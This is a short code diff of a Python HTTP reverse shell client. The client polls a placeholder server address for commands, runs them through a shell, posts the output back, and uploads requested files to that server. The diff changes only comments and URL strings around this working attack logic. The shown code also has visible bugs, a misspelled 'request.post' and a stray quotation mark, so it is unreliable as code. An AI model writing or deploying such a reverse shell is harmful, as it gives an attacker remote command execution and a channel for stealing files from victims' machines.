@@ -5,7 +5,7 @@ import os
 
 while True:
 
-	req = requests.get("Server's IP Address") #IP Address of the server
+	req = requests.get("Server's IP Address") #IP Address of the server. Example: http://0.0.0.0
 	command = req.text
 
 	if "terminate" in command: #Terminate the reverse shell
@@ -18,7 +18,7 @@ while True:
 			files = {"file": open(path, "r")}
 			r = requests.post(url, files = files)
 		else:
-			post_response = request.post(url = "http://Server's IP Address", data = "[-] Not able to find the file!")
+			post_response = request.post(url = "Server's IP Address", data = "[-] Not able to find the file!")
 	else:
 		CMD = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
 		post_response = requests.post(url = "Server's IP Address"", data = CMD.stdout.read())
